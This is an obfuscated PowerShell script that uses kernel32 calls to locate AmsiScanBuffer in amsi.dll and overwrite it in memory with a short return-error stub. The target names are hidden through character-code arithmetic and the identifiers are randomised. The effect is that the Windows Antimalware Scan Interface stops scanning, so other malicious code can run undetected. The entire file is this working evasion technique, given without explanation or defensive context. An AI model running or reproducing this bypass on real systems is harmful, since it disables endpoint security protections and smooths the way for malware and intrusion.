$bCN72q3anUR3ecxAzNQq = @"
using System;
using System.Runtime.InteropServices;
public class bCN72q3anUR3ecxAzNQq {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr HTvhsjCiDJ0hivRA, string X398lECsMzn_o5DgYf);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr vY9MBUB2l1EteTb, UIntPtr oRn0UHgIJ7h, uint yGyqdsbFJ, out uint gz_7ryrlje84ZPrmxf39);
}
"@

Add-Type $bCN72q3anUR3ecxAzNQq

$sc7TifwrdA = [bCN72q3anUR3ecxAzNQq]::LoadLibrary("$(('ám'+'sî'+'.d'+'ll').noRMaliZe([char]([BytE]0x46)+[chAR](111)+[cHar](114+39-39)+[ChAR]([bYte]0x6d)+[CHAr]([bYtE]0x44)) -replace [CHaR](92+58-58)+[CHAR]([BYTe]0x70)+[ChAR]([byte]0x7b)+[chAR]([bYte]0x4d)+[CHAR]([bYtE]0x6e)+[CHar](125+58-58))")
$YBON6LRuLL = [bCN72q3anUR3ecxAzNQq]::GetProcAddress($sc7TifwrdA, "$([cHAr]([bytE]0x41)+[ChaR]([bYte]0x6d)+[Char]([ByTe]0x73)+[chAR](105+98-98)+[cHar]([ByTE]0x53)+[chAR]([byTe]0x63)+[chAR]([byte]0x61)+[CHar]([Byte]0x6e)+[CHaR]([byTE]0x42)+[ChAr]([ByTE]0x75)+[cHar]([BYte]0x66)+[chAr](102)+[CHaR](101*90/90)+[cHaR](114*97/97))")
$p = 0
[bCN72q3anUR3ecxAzNQq]::VirtualProtect($YBON6LRuLL, [uint32]5, 0x40, [ref]$p)
$NNUy_mJOCwcM = "0xB8"
$TKAG2xAumpr = "0x57"
$Bae75fID = "0x00"
$G7HSlMgYm5Ttxbr = "0x07"
$HKDzO2jbzsD1aNro = "0x80"
$txSo7MlA = "0xC3"
$L6aJ = [Byte[]] ($NNUy_mJOCwcM,$TKAG2xAumpr,$Bae75fID,$G7HSlMgYm5Ttxbr,+$HKDzO2jbzsD1aNro,+$txSo7MlA)
[System.Runtime.InteropServices.Marshal]::Copy($L6aJ, 0, $YBON6LRuLL, 6)